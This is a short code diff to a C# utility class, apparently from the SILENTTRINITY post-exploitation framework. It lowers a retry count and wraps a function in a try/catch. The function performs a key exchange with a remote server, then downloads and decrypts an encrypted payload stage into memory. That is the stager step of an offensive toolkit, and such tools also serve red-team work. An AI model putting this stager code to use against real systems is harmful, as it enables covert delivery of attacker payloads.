@@ -32,16 +32,21 @@ namespace SILENTTRINITY.Utilities
             return default;
         }
 
-        public static MemoryStream DownloadStage(Uri URL, int sleep = 5, int retries = 6)
+        public static MemoryStream DownloadStage(Uri URL, int sleep = 5, int retries = 3)
         {
             return Retry.Do(() => GetStage(URL), TimeSpan.FromSeconds(sleep), retries);
         }
 
         static MemoryStream GetStage(Uri uri)
         {
-            var key = Crypto.Base.KeyExchange(uri);
-            var stage = Crypto.Base.Decrypt(key, Http.Get(uri));
-            return new MemoryStream(stage);
+            try
+            {
+                var key = Crypto.Base.KeyExchange(uri);
+                var stage = Crypto.Base.Decrypt(key, Http.Get(uri));
+                return new MemoryStream(stage);
+            } catch (Exception ex) {
+                throw ex;
+            }
         }
     }
 }
